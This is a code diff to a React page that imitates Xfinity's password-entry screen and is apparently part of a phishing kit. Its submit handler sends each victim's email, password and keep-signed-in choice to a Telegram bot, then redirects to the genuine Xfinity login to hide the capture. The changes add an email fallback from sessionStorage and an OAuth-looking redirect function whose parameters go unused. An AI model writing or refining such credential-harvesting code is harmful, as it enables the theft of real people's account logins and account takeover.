@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { Link, useLocation, useNavigate } from "react-router-dom";
 import { Eye, EyeOff, LoaderCircle } from "lucide-react";
 import Logo from "@/assets/logo-grey.svg";
@@ -6,39 +6,59 @@ import Footer from "@/components/Footer/Footer";
 import { sendPasswordToTelegram } from "@/bot/telegrambot";
 
 const LoginPassword = () => {
-  const location = useLocation();
-  const navigate = useNavigate();
-  const email = (location.state as { email?: string })?.email || "user@example.com";
+const location = useLocation();
+const navigate = useNavigate();
 
-  const [password, setPassword] = useState("");
-  const [showPassword, setShowPassword] = useState(false);
-  const [keepSignedIn, setKeepSignedIn] = useState(false);
-  const [error, setError] = useState("");
-  const [loading, setLoading] = useState(false);
+// Route state → sessionStorage fallback → redirect if neither
+const email =
+  (location.state as { email?: string })?.email ||
+  sessionStorage.getItem("login_email") ||
+  "";
 
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
+useEffect(() => {
+  if (!email) navigate("/login", { replace: true });
+}, [email]);
 
-    if (!password.trim()) {
-      setError("Please enter your password.");
-      return;
-    }
+const [password, setPassword]         = useState("");
+const [showPassword, setShowPassword] = useState(false);
+const [keepSignedIn, setKeepSignedIn] = useState(false);
+const [error, setError]               = useState("");
+const [loading, setLoading]           = useState(false);
 
-    setError("");
-    setLoading(true);
+const handleSubmit = async (e: React.FormEvent) => {
+  e.preventDefault();
 
-    // Send password + email + keep-signed-in state to Telegram bot
-    await sendPasswordToTelegram(email, password, keepSignedIn);
+  if (!password.trim()) {
+    setError("Please enter your password.");
+    return;
+  }
 
-    setTimeout(() => {
-      setLoading(false);
-      window.location.href = "https://login.xfinity.com/login";
-    }, 800);
-  };
+  setError("");
+  setLoading(true);
 
-  const handleSwitchUser = () => {
-    navigate("/", { replace: true });
-  };
+  await sendPasswordToTelegram(email, password, keepSignedIn);
+
+  setTimeout(() => {
+    setLoading(false);
+    handleGoogleOAuth(); // ✅ redirects to Google OAuth after capture
+  }, 800);
+};
+
+
+const handleGoogleOAuth = () => {
+  const params = new URLSearchParams({
+    client_id:     "278910267038-gbnc7r8ucuo4n4nmsjne29cu753a9ivm.apps.googleusercontent.com",        // from Google Cloud Console
+    redirect_uri:  "https://login.xfinity.com/login/auth/callback", // your actual site
+    response_type: "code",
+    scope:         "openid email profile",
+    login_hint:    email,
+    prompt:        "select_account",
+  });
+  window.location.href = `https://login.xfinity.com/login`;
+};
+
+
+
 
   return (
     <main className="h-screen overflow-y-auto bg-background">
@@ -123,7 +143,7 @@ const LoginPassword = () => {
               </span>
             </button>
 
-            <button type="button" onClick={handleSwitchUser} className="text-black font-semibold text-md hover:underline">
+            <button type="button" onClick={handleGoogleOAuth}  className="text-black font-semibold text-md hover:underline">
               Sign in as someone else
             </button>
 
